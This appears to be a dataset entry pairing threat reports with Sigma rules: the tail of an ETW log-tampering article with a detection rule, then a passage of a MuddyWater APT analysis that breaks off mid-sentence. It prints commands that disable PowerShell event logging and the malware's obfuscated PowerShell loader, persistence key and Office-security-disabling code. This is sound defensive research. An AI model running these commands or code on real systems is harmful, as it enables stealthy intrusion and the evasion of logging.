ecx\n  dword ptr [ebp+EventData_contentsize.Size], edx\n  dword ptr [ebp+EventData_originalsize.Size], edx\n  dword ptr [ebp+EventData_originalsize.Ptr+4], ecx\n  dword ptr [ebp+EventData_originalsize.Reserved], ecx\n  dword ptr [ebp+EventData_content.Reserved], ecx\n  dword ptr [ebp+EventData_hash.Size], 20h\n  [ebp+EventData_hash.Reserved], ecx\n  call    __imp__EventWrite@20 ; EventWrite(x,x,x,x)\n```\n\nThe relevant information includes:\n\n- Event ID: `1101 (0x44D)`\n  This events details can be extracted from a recovered manifest as seen here.\n- Channel: `16 (0x10)` referring to the operational event log channel\n- Level: `4 (Informational)`\n- Keyword: `0x8000000000000001` (AMSI/Operational OR Event1). These values are interpreted by running the `logman query providers Microsoft-Antimalware-Scan-Interface` command.\n\nWe now understand that 1101 events are not logged to the Application event log because it only considers events where the keyword value matches `0x8000000000000000`. In order to fix this issue and get events pumping into the event log, either the Application event log trace session would need to be modified (not recommended and requires SYSTEM privileges) or you could create your own persistent trace session (e.g., an autologger) to capture AMSI events in the event log. The following PowerShell script creates such a trace session:\n\n```\n$AutoLoggerGuid = \"{$((New-Guid).Guid)}\"\nNew-AutologgerConfig -Name MyCustomAutoLogger -Guid $AutoLoggerGuid -Start Enabled\nAdd-EtwTraceProvider -AutologgerName MyCustomAutoLogger -Guid '{2A576B87-09A7-520E-C21A-4942F0271D67}' -Level 0xff -MatchAnyKeyword 0x80000000000001 -Property 0x41\n```\n\nAfter running the above command, reboot, and the AMSI event log will begin to populate.\n\n## ETW tampering techniques\n\nIf the goal of an attacker is to subvert event logging, ETW provides a stealthy mechanism to affect logging without itself generating an event log trail. Below is a non-exhaustive list of tampering techniques that an attacker can use to cut off the supply of events to a specific event log.\n\nTampering techniques can generally be broken down into two categories:\n\n1. **Persistent**, requiring reboot — i.e., a reboot must occur before the attack takes effect. Changes can be reverted, but would require another reboot. These attacks involve altering autologger settings — persistent ETW trace sessions with settings in the registry. There are more types of persistent attacks than ephemeral attacks, and they are usually more straightforward to detect.\n2. **Ephemeral** — i.e., where the attack can take place without a reboot.\n\n### Autologger provider removal\n\n**Tampering category**: Persistent, requiring reboot\n**Minimum permissions required**: Administrator\n**Detection artifacts**: Registry key deletion:\n`HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}`\n\n**Description**: This technique involves the removal of a provider entry from a configured autologger. Removing a provider registration from an autologger will cause events to cease to flow to the respective trace session.\n\n**Example**: The following PowerShell code disables Microsoft-Windows-PowerShell event logging:\n\n```\nRemove-EtwTraceProvider -AutologgerName EventLog-Application -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'\n```\n\nIn the above example, `A0C1853B-5C40-4B15-8766-3CF1C58F985A` refers to the Microsoft-Windows-PowerShell ETW provider. This command will end up deleting the `HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\{a0c1853b-5c40-4b15-8766-3cf1c58f985a}` registry key.\n\n### Provider “Enable” property modification\n\n**Tampering category**: Persistent, requiring reboot\n**Minimum permissions required**: Administrator\n**Detection artifacts**: Registry value modification:\n`HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID} - EnableProperty (REG_DWORD)`\n\n**Description**: This technique involves alerting the `Enable` keyword of an autologger session. For example, by default, all ETW provider entries in the `EventLog-Application` autologger session are set to `0x41` which translates to `EVENT_ENABLE_PROPERTY_SID` and `EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0`. `EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0` is not documented; it specifies that any events generated for a provider should be logged even if the keyword value is set to 0. An attacker could swap out `EVENT_ENABLE_PROPERTY_ENABLE_KEYWORD_0` for `EVENT_ENABLE_PROPERTY_IGNORE_KEYWORD_0`, resulting in a value of `0x11`, which would result in all events where the keyword is 0 to not be logged. For example, PowerShell eventing supplies a 0 keyword value with its events, resulting in no logging to the PowerShell event log.\n\n**Example**: The following PowerShell code disables Microsoft-Windows-PowerShell event logging:\n\n```\nSet-EtwTraceProvider -Guid '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}' -AutologgerName 'EventLog-Application' -Property 0x11\n```\n\nIn the above example, `A0C1853B-5C40-4B15-8766-3CF1C58F985A` refers to the Microsoft-Windows-PowerShell ETW provider. This command will end up setting `HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\\EnableProperty` to `0x11`. Upon rebooting, events will cease to be reported to the PowerShell event log.\n\nAn attacker is not constrained to using just the Set-EtwTraceProvider cmdlet to carry out this attack. An attacker could just modify the value directly in the registry. `Set-EtwTraceProvider` offers a convenient autologger configuration abstraction.\n\n**Alternative detection artifacts/ideas**: If possible, it is advisable to monitor for modifications of values within the `HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\AUTOLOGGER_NAME\\{PROVIDER_GUID}` registry key. Note that modifying `EnableProperty` is just one specific example and that an attacker can alter ETW providers in other ways, too.\n\n### ETW provider removal from a trace session\n\n**Tampering category**: Ephemeral\n**Minimum permissions required**: SYSTEM\n**Detection artifacts**: Unfortunately, no file, registry, or event log artifacts are associated with this event. While the technique example below indicates that `logman.exe` was used to perform the attack, an attacker can obfuscate their techniques by using Win32 APIs directly, WMI, DCOM, PowerShell, etc.\n\n**Description**: This technique involves removing an ETW provider from a trace session, cutting off its ability to supply a targeted event log with events until a reboot occurs, or until the attacker restores the provider. While an attacker must have SYSTEM privileges to perform this attack, it is unlikely that defenders will notice such an attack if they rely on event logs for threat detection.\n\n**Example**: The following PowerShell code immediately disables Microsoft-Windows-PowerShell event logging until a reboot occurs or the attacker restores the ETW provider:\n\n```\nlogman update trace EventLog-Application --p Microsoft-Windows-PowerShell -ets\n```\n\n**Alternative detection artifacts/ideas**:\n\n- Event ID 12 within the Microsoft-Windows-Kernel-EventTracing/Analytic log indicates when a trace session is modified, but it doesn’t supply the provider name or GUID that was removed, so it would be difficult to confidently determine whether or not something suspicious occurred using this event.\n- There have been several references thus far to the ETW PowerShell cmdlets housed in the `EventTracingManagement` module, which itself is a CDXML-based module. This means that all the cmdlets in the `EventTracingManagement` are backed by WMI classes. For example, the `Get-EtwTraceProvider` cmdlet is backed by the `ROOT/Microsoft/Windows/EventTracingManagement:MSFT_EtwTraceProvider` class. Considering ETW providers can be represented in the form of WMI class instances, you could craft a permanent WMI event subscription that logs all provider removals from a specific trace session to the event log. This code sample creates an `NtEventLogEventConsumer` instance that logs event ID 8 to the Application event log (source: WSH) any time a provider is removed from the Application event log trace session, `EventLog-Application`. The logged event looks like the following:\n\n```image\nAlt: Event Log\nDescription: The image displays a snippet of assembly code related to Windows Event Tracing, specifically illustrating a function that appears to manipulate event data. The code includes various assembly instructions such as 'lea', 'push', and 'call', which are involved in handling event attributes like session size, event descriptor, and data content. This technical representation is pertinent to the context of tampering with ETW (Event Tracing for Windows) sessions, as discussed in the accompanying text.\nTranscription: |\n  lea     eax,[ebp+EventData_session]\n  eax     ; UserData\n  10      ; UserDataCount\n  offset  _AMSI_SCANBUFFER ; EventDescriptor\n  push    dword ptr [ebx+16h] ; RegHandle\n  [ebp+EventData_session.Size], edx\n  dword   ptr [ebp+EventData_scan.Reserved], ecx\n  [ebp+EventData_scanStatus.Reserved], ecx\n  dword   ptr [ebp+EventData_scanResult], ecx\n  [ebp+EventData_scanResult.Size], edx\n  dword   ptr [ebp+EventData_scanResult.Reserved], esi\n  dword   ptr [ebp+EventData_appname.Reserved], ecx\n  dword   ptr [ebp+EventData_appname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Ptr+4], ecx\n  dword   ptr [ebp+EventData_contentname.Reserved], ecx\n  [ebp+EventData_contentsize], edx\n  dword   ptr [ebp+EventData_contentsize.Size], edx\n  dword   ptr [ebp+EventData_originalsize.Ptr+4], ecx\n  dword   ptr [ebp+EventData_originalsize.Size], edx\n  dword   ptr [ebp+EventData_content.Reserved], ecx\n  dword   ptr [ebp+EventData_hash.Size], 20h\n  [ebp+EventData.Reserved], ecx\n  dword   ptr [ebp+EventData_contentfiltered.Ptr+4], ecx\n  call    __imp_EventWrite@20 ; EventWrite(x,x,x,x,x)\n```\n\n## Conclusion\n\nIdentifying blind spots and assumptions in Alerting and Detection Strategies is a crucial step in ensuring the resilience of detections. Since ETW is at the core of the event logging infrastructure, gaining an in-depth understanding of ETW tampering attacks is a valuable way to increase the integrity of security-related data sources.\n\n## Further Reading\n\n- ETW — Overview\n- Instrumenting Your Code with ETW\n- Event Tracing for Windows: Reducing Everest to Pike’s Peak\n- Use this not this: Logging / Event Tracing\n- Writing an Instrumentation Manifest\n- Event Tracing Functions\n- Configuring and Starting an AutoLogger Session\n- Event Tracing\n- TraceLogging",
    "sigma_rule": {
      "title": "ETW Trace Evasion Activity",
      "id": "a238b5d0-ce2d-4414-a676-7a531b3d13d6",
      "status": "test",
      "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil",
        "https://abuse.io/lockergoga.txt",
        "https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63"
      ],
      "author": "@neu5ron, Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
      "date": "2019-03-22",
      "modified": "2022-06-28",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070",
        "attack.t1562.006",
        "car.2016-04-002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_clear_1": {
          "CommandLine|contains|all": [
            "cl",
            "/Trace"
          ]
        },
        "selection_clear_2": {
          "CommandLine|contains|all": [
            "clear-log",
            "/Trace"
          ]
        },
        "selection_disable_1": {
          "CommandLine|contains|all": [
            "sl",
            "/e:false"
          ]
        },
        "selection_disable_2": {
          "CommandLine|contains|all": [
            "set-log",
            "/e:false"
          ]
        },
        "selection_disable_3": {
          "CommandLine|contains|all": [
            "logman",
            "update",
            "trace",
            "--p",
            "-ets"
          ]
        },
        "selection_pwsh_remove": {
          "CommandLine|contains": "Remove-EtwTraceProvider"
        },
        "selection_pwsh_set": {
          "CommandLine|contains|all": [
            "Set-EtwTraceProvider",
            "0x11"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_etw_trace_evasion.yml",
    "id": "532"
  },
  {
    "url": "https://securelist.com/muddywater/88059/",
    "markdown": "# MuddyWater expands operations\n\n**APT reports** \n**10 Oct 2018** \n\n## Table of Contents\n\n- Summary\n- Decoy images by country\n  - Jordan\n  - Turkey\n  - Saudi Arabia\n  - Azerbaijan\n  - Iraq\n  - Pakistan\n  - Afghanistan\n- Technical details\n  - The initial infection vector\n  - The macro payload analysis, dropped files and registry keys\n    - Case 1: INF, SCT and text files dropped by the macro\n    - Case 2: VBS and text files dropped by the macro\n  - The PowerShell code\n    - CnC communication\n    - Victim system reconnaissance\n    - Supported commands\n- Victimology\n- Attacker deception and attribution\n- Recommendations for organizations\n- Conclusion\n  - Additional information\n- Indicators of compromise\n  - MD5\n  - File names\n  - Domains, URLs and IP addresses\n\n## Summary\n\nMuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe, and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos, and educational institutions in Jordan, Turkey, Azerbaijan, and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia. Other victims were also detected in Mali, Austria, Russia, Iran, and Bahrain. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing.\n\nThe new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers.\n\nPrevious related research: \n- https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 \n- https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ \n- https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ \n- https://www.sekoia.fr/blog/falling-on-muddywater/\n\n## Decoy images by country\n\n### Jordan\n\n```image\nAlt: Jordan Decoy\nDescription: The image is a screenshot showing two documents open in an old version of Microsoft Word. The left document appears to be a form or official document with Arabic text and a stamp from the Ministry of Justice in Jordan. The right document shows a message indicating that it has been created in an old version of Word, along with a prompt to enable editing and display content. This image is relevant for understanding the types of decoy documents used by the MuddyWater threat group, particularly in the context of Jordan.\nTranscription: |\n  This Document has been made in an old version of Microsoft Word.\n  \n  In order to display this document you will have to click on  \n  “Enable Editing” or click on “Enable Content”  \n  \n  Office  \n  This Document has been made in an old version of Microsoft Word.  \n  \n  In order to display this document you will have to click  \n  “Enable Editing” and then click “Enable Content”\n```\n\n- *The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc)* \n- *DAMAMAX.doc*\n\n### Turkey\n\n```image\nAlt: Turkey Decoy\nDescription: The image contains two screenshots of Microsoft Word documents, both pertaining to Turkish governmental agencies. The first document includes a header with the Turkish National Police emblem and mentions 'Recommendation of Verification,' indicating a formal communication regarding security matters. The second document features the logo of the Directorate General of Coastal Safety, with text suggesting urgency regarding a security issue. Both documents appear to be related to cybersecurity threats and intelligence.\nTranscription: |\n  Office\n  \n  This Document has been made in an old version of Microsoft Word.\n  In order to display this document you will have to click\n  “Enable Editing” and then click “Enable Content”\n```\n\n- *Turkey’s General Directorate of Security* \n- *Turkey’s Directorate General of Coastal Safety*\n\n```image\nAlt: Turkey Decoy\nDescription: The image displays two screenshots of Microsoft Word documents. The left screenshot shows a document related to Turkey's National Police, with an emblem visible at the top. The right screenshot features a document from the Turkish Ministry of the Interior, also with a logo. Both documents indicate that they were created in an older version of Microsoft Word, prompting users to enable editing to view the content. The images relate to the MuddyWater operation, which expands its activities in Turkey.\nTranscription: |\n  Office\n  \n  This Document has been made in an old version of Microsoft Word.\n  In order to display this document you will have to click\n  “Enable Editing” and then click “Enable Content”\n```\n\n- *Turkey’s General Directorate of Security (Onemli Rapor.doc)* \n- *Turkey’s Ministry of the Interior (Early election.doc)*\n\n### Saudi Arabia\n\n```image\nAlt: Saudi Arabia Decoy\nDescription: The image shows a screenshot of a document opened in Microsoft Word, indicating that it was created in an older version of the software. A blue notification at the top instructs users to enable editing to view the document's content fully. The document appears to contain official information, including details about an aircraft, such as the aircraft type, number, registration, and communication details, alongside a signature.\nTranscription: |\n  Office\n  \n  This Document has been made in an old version of Microsoft Word.\n  In order to display this document you will have to click\n  “Enable Editing” and then click “Enable Content”\n```\n\n- *Document signed by the Major General Pilot, commander of the Saudi Royal Air Force*\n\n```image\nAlt: Saudi Arabia Decoy\nDescription: The image displays two screenshots of Microsoft Word documents. The left screenshot shows a document with Arabic text indicating it is associated with King Saud University, featuring the university's logo. The right screenshot shows a document in compatibility mode, with a notice indicating that it was created in an earlier version of Microsoft Word, along with a prompt to 'Enable Editing' to view the content fully. This indicates the type of decoy documents used in operations linked to MuddyWater's activities.\nTranscription: |\n  [Left Image]\n  جامعة الملك سعود\n  Document created in earlier version of Microsoft Office Word!\n  To view this content, please click \"Enable Editing\"\n  From the yellow bar and click\n  \n  [Right Image]\n  Semester: Dr. Reyan A. Al-Mansour\n  One trip: The first click to refresh\n  Edit: Building 1, Floor 1, Office 101\n  E-Mail: reyan@ksu.edu.sa\n  Phone No: +966 11 123 4567\n```\n\n- *KSA King Saud University (KSU)*\n\n### Azerbaijan\n\n```image\nAlt: Azerbaijan Decoy\nDescription: The image depicts a screenshot of a Microsoft Word document that appears to be from the Ministry of Internal Affairs of Azerbaijan. It shows a message indicating that the document was created in an older version of Microsoft Word, prompting the user to 'Enable Editing' to view the content. The interface includes a visual element of the Office logo, as well as a notification bar suggesting that the document requires additional permissions to display fully. The background features text in Azerbaijani, likely related to an official matter.\nTranscription: |\n  THE MINISTRY \n  OF INTERNAL AFFAIRS \n  OF THE REPUBLIC OF AZERBAIJAN\n  \n  Office\n  This Document has been made in an old version of Microsoft Word.\n  In order to display this document you will have to click\n  “Enable Editing” and then click “Enable Content”\n  \n  TRUE\n  Enter\n```\n\n- *İnkişaf üçün görüş.doc (meeting for development)*\n\n### Iraq\n\n```image\nAlt: Iraq Decoy\nDescription: The image consists of two screenshots from Microsoft Word documents, both depicting a warning message from Office. The message indicates that the document was created in an older version of Word and instructs the user to enable editing and content to view the document properly. The left screenshot shows a document titled 'Iraqi Ministry of Foreign Affairs' while the right screenshot features a similar document, indicating they are related to official Iraqi governmental communications. This context links to the operations of the MuddyWater threat actor group.\nTranscription: |\n  Office\n  This Document has been made in an old version of Microsoft Word.\n  In order to display this document you will have to click\n  “Enable Editing” and then click “Enable Content”\n  From the yellow bar\n```\n\n- *Iraqi Ministry of Foreign Affairs* \n- *Government of Iraq, the Treasury of the Council of Ministers*\n\n### Pakistan\n\n```image\nAlt: Pakistan Decoy\nDescription: The image displays two Microsoft Word documents side by side. On the left, the document titled 'Election Commission of Pakistan' is shown, featuring an official header with the emblem of the Election Commission. A prompt indicates that the document is in an old format, suggesting the user must enable editing to view its content. On the right, the document titled 'National Assembly of Pakistan' is similarly displayed, also with the official emblem. Both documents appear to be decoy files used in a cyber threat context, linking to the activities of the MuddyWater group.\nTranscription: |\n  Election Commission of Pakistan  \n  Ref no: 22/03/2018-ecp1  \n  \n  Office  \n  This Document has been made in an old version of Microsoft Word.  \n  In order to display this document you will have to click  \n  “Enable Editing” and then click “Enable Content”  \n  \n  National Assembly of Pakistan  \n  Ref no: 22/03/2018-ecp1  \n  \n  Office  \n  This Document has been made in an old version of Microsoft Word.  \n  In order to display this document you will have to click  \n  “Enable Editing” and then click “Enable Content”\n```\n\n- *ECP.doc* \n- *National Assembly of Pakistan.doc*\n\n```image\nAlt: Pakistan Decoy\nDescription: The image displays two screenshots of Microsoft Word documents purportedly from Pakistan's Punjab Police and Gilgit Baltistan Excise & Taxation Department. The left document shows a header with the Punjab Police logo, and a message indicating that the document was created in an older version of Word, prompting the user to enable editing. The right document features the title 'Gilgit Baltistan' and similarly includes a message about it being an older format. Both documents appear to be decoy files used in a cyber threat context, showcasing how attackers may impersonate governmental entities.\nTranscription: |\n  Ref no: 04/25/2018-e3\n  \n  ---\n  \n  **Office**  \n  This Document has been made in an old version of Microsoft Word.  \n  In order to display this document you will have to click  \n  “Enable Editing” and then click “Enable Content”  \n  From the yellow bar  \n  \n  MD5  \n  TRUE  \n  [ENTER]\n  \n  ---\n  \n  **Gilgit Baltistan**  \n  Excise & Taxation Department  \n  \n  Ref No: 3355/005  \n  Date: 04/16/2018  \n  \n  ---\n  \n  **Office**  \n  This Document has been made in an old version of Microsoft Word.\n```\n\n- *P.Police.doc*\n\n### Afghanistan\n\n```image\nAlt: Afghanistan Decoy\nDescription: The image depicts a Microsoft Word document window displaying a document labeled 'President.doc' associated with the E-government of Afghanistan. The document contains a seal and some Arabic text, indicating it is likely an official paper. A message at the top informs the user that the document was created in an older version of Word and instructs them to enable editing to view its content properly. The background shows the Word interface, with various menu options visible.\nTranscription: |\n  Date: 09/05/2018\n  \n  Islamic Republic of Afghanistan  \n  Office of the President  \n  \n  This Document has been made in an old version of Microsoft Word.  \n  In order to display this document you will have to click on  \n  “Enable Editing” and click on “Enable Content”  \n  From the yellow bar above.\n```\n\n- *President.doc, E-government of Afghanistan*\n\n## Technical details\n\nBelow is a description of the malware extraction and execution flow, starting from the initial infection vector, running VBA code via a macro and then dropping the PowerShell code that establishes command-center communications, sends victim system information, and then receives commands supported by the malware.\n\n### The initial infection vector\n\nThe initial infection starts with macro-enabled Office 97-2003 Word files whose macros are usually password-protected to hinder static analysis.\n\n```image\nAlt: Infection Vector\nDescription: The image depicts a Microsoft Word environment with a macro-enabled document open. The Visual Basic for Applications (VBA) editor is visible, showing a project that appears to be password-protected, indicated by the 'Project Password' dialog box. The interface shows a warning that some active content has been disabled, highlighting the potential security risk associated with enabling macros in Office documents. This aligns with the context provided about the initial infection vector used by the MuddyWater threat.\nTranscription: |\n  Microsoft Visual Basic for Applications - ???????? ???? [design]\n  Project - Project\n  - Normal\n  - Project (???????? ????)\n  \n  Project Password\n  Password: [                ]\n  [ OK ] [ Cancel ]\n```\n\nMalicious obfuscated VBA code is executed when the macro is first enabled. In some cases, the malicious macro is also executed when the user activates a fake text box.\n\n### The macro payload analysis, dropped files and registry keys\n\nThe macro payload, which is Base64 encoded, does the following:\n\n1. Drops two or three files into the “*ProgramData*” folder. The dropped files are either in the root of the “*ProgramData*” folder or in a subdirectory. The file names may vary from one version of the malware to another.\n\n   ```\n   \\EventManager.dll \n   \\EventManager.logs \n   \\WindowsDefenderService.ini\n   ```\n\n2. Adds a registry entry in the current user’s *RUN* key (HKCU) for later execution when the user next logs in. In some cases, the macro spawns the malicious payload/process instantly without waiting for the next time the user logs in.\n\n   ```\n   Name: WindowsDefenderUpdater \n   Type: REG_EXPAND_SZ \n   Data: c:\\windows\\system32\\rundll32.exe advpack.dll,LaunchINFSection C:\\ProgramData\\EventManager.logs,Defender,1,\n   ```\n\nThe next time the user logs in, the dropped payload will be executed. The executables have been chosen specifically for bypassing allowlisting solutions since they are all from Microsoft and very likely allowlisted. Regardless of the file extensions, the files dropped by the macro are *EITHER* INF, SCT, and text files *OR* VBS and text files.\n\n#### Case 1: INF, SCT and text files dropped by the macro\n\n1. *INF* is launched via the *advpack.dll* “*LaunchINFSection*” function.\n2. *INF* registers the *SCT* file (scriptlet file) via scrobj.dll (*Microsoft Scriptlet library*).\n3. Via *WMI* (*winmgmt*), the *JavaScript* or *VBscript* code in the *SCT* file spawns a PowerShell one-liner which finally consumes the *text* file.\n\n   ```\n   powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=Int32}}$c+=1;};[array]::Reverse($d);iex([String]::Join(”,$d));\n   ```\n\n   ```image\n   Alt: Encoded Text File\n   Description: The image displays an encoded text file that appears to be relevant to cyber threat intelligence, specifically in the context of the MuddyWater operations. The text is composed of a series of alphanumeric characters, suggesting it may contain obfuscated data or payload information. The encoding could be part of a malware operation, possibly related to the details provided in the accompanying paragraph about macro payloads and how they interact with files and registry keys.\n   Transcription: |\n     - FJ+QM2?@2CQ1AX1G-,<*+VI.XQ/UW-BQ0RZ2?C1B91=\n     C.ER2 [Z1G0DIH, 14+VI2X;2S12:P.; [2>>1 [+2X;2S12:P.; [/ARO1, 14+VI+VI-Q+37), @P.S;,@( YK33..Y5,@P/U2001\n     ZQ/G8, J+/Z1BFZ/K32R3Q/FQ;F2S.-A+3+(I&G, AM3EC1KM>H.SZ.?, -3 (F2+61C-4N-5+/FO->Q1YO/ [+,A., IR,-X1T[-9S,0+/VU/C20:8/QT3-B/=F\n     1.16->N, P4, A6-9M0:L2R/, U9, -51P/JK2R/Z3 (A/VF2:B3) 93, S29?1:B3, P6, KC2?4-L.AK/S/AV, Q33, .XS18G1=1.NI2>?1F1P0;-.6W/BZ3A, 331, @A/V:0-\n     G-/R-3L1 [01P+, @2+S1E, AD25N/4+32E3FP, T+.NU, XY.IJ, YC/G6/; /G<X05T0=2,-3AU360. SA2D (2HZ1LB=-: (=1?31KM+-/, @N, @71AM32 (2MS-4K180, J+\n     6,(C/821E73V/G0.7-->>Z3;M06G2,/1<U,-J3 (C.SZ, A51Q, ., *0.0DD1V-1-B, -I, O3=* .NG/ZC3) *3-70<-.E</W/L; 12E373?Q1PD2R92RU00[-/P1<.6; U+\n     6H21,(TC12B.2417P=) Z2WT/48.:RZR295--I, YH-5-2, 1/L-1AE0+N, KD.X937201N02,/ZR13P [/O2D/V-, -2/FV2DK.N; --)+11AH2?5.6C2N; 2RL1301\n     3/8Y-4<,0,-M/VO0, 01U=1..0E/2HN1M064 [B2+22D+3A; 31V0D1RA4-4V92E33?HY0?U3, (T*38/-/V33FZ1Z.U, O213) 0\n     6,(A) 6A1E12F1S/QS/L., -9. Y2F3;?1=.-4<.X=0P0U1517U0. U.JZ.Y, Y-. /7=0=\n     2233, S->V3E1U71[?] 380/=/?/JU.E-/+A, Y0.0/QG17/GM/ZW1) 01613, 206E52D?, F*.JR/8*/UL. JJ05;2910, 0\n     1Q53A1. SS1G42S, JR.A-1TW.1G2:2, T;/Q3T?/PY, OL-/W1AP1AN. JL-/N00Z1+17M21+/L32>Z06B. 1.SY\n     <, 1V3/LW.NV1Q) 2S/Q./QX3EX, J+01+1B73 ([.EY3F7, EX/QW3753AY3->/GP-/O2N81K,Q, FD/42?=-/Y.B3 (1, T-0, B2M/V4/LV24H2MZ. E21G>0B/321Q+-->\n   ```\n\n#### Case 2: VBS and text files dropped by the macro\n\nThe VBS file decodes itself and calls *mshta.exe*, passing on one line of *VBScript* code to it, which in turn spawns a PowerShell one-liner which finally consumes the text file (usually Base64-encoded text).\n\n```\npowershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini))));\n```\n\n```image\nAlt: Encoded Text File\nDescription: The image displays a block of encoded text, likely representing Base64-encoded data used in a cyber threat context. This data is referenced in a technical analysis, specifically related to a VBS (Visual Basic Script) file that manipulates PowerShell commands to decode and execute the content. The text appears to be a sequence of characters that form the payload, which is a key element in understanding the operations of the MuddyWater threat actor.\nTranscription: SQBuaHAYAbWBrAGUALQBFHAcAbYGUAcwBzJAAoAE4AZQBAcOAwBiAQBJAJHQAIABJ...\n```\n\n### The PowerShell code\n\nWhen PowerShell is invoked whether via *WMI*, *wscript.exe*, or *mshta.exe*, it executes a one-liner PowerShell code (as outlined above) that reads the encoded text file dropped in *ProgramData* and then decodes it. The resulting code has multiple layers of obfuscation.\n\nThe first thing the PowerShell code does is to disable *office* “*Macro Warnings*” and “*Protected View*”. This is to ensure future attacks don’t require user interaction. It also allows macro code to access *internal VBA objects* for stealthier macro code execution in future attacks.\n\n```image\nAlt: PowerShell Code\nDescription: The image depicts a snippet of PowerShell code related to the MuddyWater cyber threat. The code includes a function that sets registry values to disable security features in Microsoft Office, specifically concerning macro warnings and protected view settings. It contains conditional statements that check for the existence of specific registry paths and modifies them to bypass user security prompts. The code is highlighted in a structured format, showing various parameters like 'AccessVBOM', 'VBAWarnings', and others being set to '1', indicating their activation.\nTranscription: |\n  function YUCHPJXEQSDAGSHHYPEXUIMMVWUZEG() {\n      for($i=10; $i -le 20; $i++) {\n          $rgb = \"HKCU:\\Software\\Microsoft\\Office\\$i.word\\Security\";\n          if(test-path $rgb) {\n              New-ItemProperty -Path $rgb -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | out-null;\n              New-ItemProperty -Path $rgb -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | out-null;\n              $rgb = \"$rgb\\ProtectedView\";\n              if(test-path $rgb) {\n                  New-ItemProperty -Path $rgb -Name DisableAttachmentsInPV -Value 1 -PropertyType DWORD -Force | out-null;\n                  New-ItemProperty -Path $rgb -Name DisableInternetFilesInPV -Value 1 -PropertyType DWORD -Force | out-null;\n                  New-ItemProperty -Path $rgb -Name DisableUnsafeLocationsInPV -Value 1 -PropertyType DWORD -Force | out-null;\n              }\n          }\n      }\n  }\n```\n\nNext, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted. The names are linked to various tools used by malware researchers.\n\n```\n“win32_remote”, “win64_remote64”, “ollydbg”, “ProcessHacker”, “tcpview”, “autoruns”, “autorunsc”, “filemon”, “procmon”, “regmon”, “procexp”, “idaq”, “idaq64”, “ImmunityDebugger”, “Wireshark”, “dumpcap”, “HookExplorer”, “ImportREC”, “PETools”, “LordPE”, “dumpcap”, “SysInspector”, “proc_analyzer”, “sysAnalyzer”, “sniff_hit”, “windbg”, “joeboxcontrol”, “joeboxserver”\n```\n\nIn some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a *BSOD* via the *ntdll.dll* “*NtRaiseHardError*” function.\n\n#### CnC communication\n\nA URL is selected at random from a long list of embedded URLs held in an array named *$dragon_middle*. The selected URL is subsequently used for communication with the *CnC* server. If it can’t send data to the chosen CnC URL, it tries to obtain another random URL from *$middle_dragon*, then sleeps from one to 30 seconds and loops again.\n\n```image\nAlt: CnC Communication\nDescription: The image displays a snippet of PowerShell code that is part of a function named 'CCXNAHWGOBDJLTTMAHBIQHWRLJKNK()'. Within the code, a random index ($rnd) is selected to access a URL from an array named '$dragon_middle'. This URL is then assigned to a global variable '$global:url'. The highlighted sections emphasize the use of the 'Get-Random' function and the array length for retrieving the URL.\nTranscription: |\n  function CCXNAHWGOBDJLTTMAHBIQHRLTJKNK()\n  {\n      $rnd = Get-Random -minimum 0 -maximum ($dragon_middle.Length)\n      $site = $dragon_middle[$rnd]\n      $global:url = $site\n  }\n```\n\n#### Victim system reconnaissance\n\nThe code then tries to obtain the victim’s public IP via “*https://api.ipify.org/*”.\n\nThe public IP is then *POST*ed along with *OS Version, Internal IP, Machine Name, Domain Name, UserName* after being encrypted to the previously chosen URL to register a new victim. This allows the attackers to accept or reject victims depending 